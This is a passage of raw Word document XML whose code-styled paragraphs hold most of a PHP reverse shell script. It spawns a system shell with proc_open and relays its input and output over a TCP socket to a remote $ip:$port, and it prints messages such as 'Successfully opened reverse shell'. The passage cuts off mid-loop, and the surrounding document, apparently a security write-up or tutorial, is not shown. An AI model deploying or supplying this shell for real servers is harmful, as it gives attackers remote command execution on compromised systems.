      </w:r>
    </w:p>
    <w:p w14:paraId="4EFD15DE" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>$descriptorspec = array(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E3CBCB7" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   0 =&gt; array("pipe", "r"),  // stdin is a pipe that the child will read from</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B2094DE" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   1 =&gt; array("pipe", "w"),  // stdout is a pipe that the child will write to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BFBE111" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">   2 =&gt; array("pipe", "w")   // stderr is a pipe that the child will write to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58F6098A" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71D8CE18" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="25675C31" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>$process = proc_open($shell, $descriptorspec, $pipes);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="094885D1" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E425760" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>if (!is_resource($process)) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="121EDD69" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>printit("ERROR: Can't spawn shell");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4520CF53" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>exit(1);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16BE7640" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23CB3996" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="466CFC25" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// Set everything to non-blocking</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E11EA50" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>// Reason: Occsionally reads will block, even though stream_select tells us they won't</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7056D4DA" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>stream_set_blocking($pipes[0], 0);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E30AE93" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>stream_set_blocking($pipes[1], 0);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CA60F26" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>stream_set_blocking($pipes[2], 0);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49A0052A" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>stream_set_blocking($sock, 0);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AF2E65D" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="737C49E9" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>printit("Successfully opened reverse shell to $ip:$port");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="022C5E78" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B30C794" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>while (1) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19657C7F" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>// Check for end of TCP connection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6565C4C3" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>if (feof($sock)) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C3A68A0" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>printit("ERROR: Shell connection terminated");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37CC784D" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>break;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A2FE1F6" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59FC78DA" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45B51EE8" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>// Check for end of STDOUT</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="506F90B5" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>if (feof($pipes[1])) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="630F5534" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>printit("ERROR: Shell process terminated");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E44A9D8" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>break;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B34AA46" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E74FAFF" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68CDF1FC" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>// Wait until a command is end down $sock, or some</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FC9395F" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>// command output is available on STDOUT or STDERR</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25AACFC6" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>$read_a = array($sock, $pipes[1], $pipes[2]);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24F1A5BD" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65701016" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17260053" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>// If we can read from the TCP socket, send</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27E72BF2" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>// data to process's STDIN</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A8DBACD" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>if (in_array($sock, $read_a)) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A444D25" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>if ($debug) printit("SOCK READ");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09507C41" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>$input = fread($sock, $chunk_size);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FBB8E18" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>if ($debug) printit("SOCK: $input");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09472FAD" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>fwrite($pipes[0], $input);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AFCA431" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1933A2F3" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6CFF1220" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>// If we can read from the process's STDOUT</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10674B44" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>// send data down tcp connection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65BF2A12" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>if (in_array($pipes[1], $read_a)) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71BDE17B" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>if ($debug) printit("STDOUT READ");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C802FEF" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>$input = fread($pipes[1], $chunk_size);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CBBAE3A" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>if ($debug) printit("STDOUT: $input");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4717CF12" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>fwrite($sock, $input);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="776FC3DF" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15BA3627" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="23BC3EA0" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>// If we can read from the process's STDERR</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07BB4C68" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>// send data down tcp connection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="376EE1D0" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>if (in_array($pipes[2], $read_a)) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33D9AC99" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>if ($debug) printit("STDERR READ");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40BF40B9" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
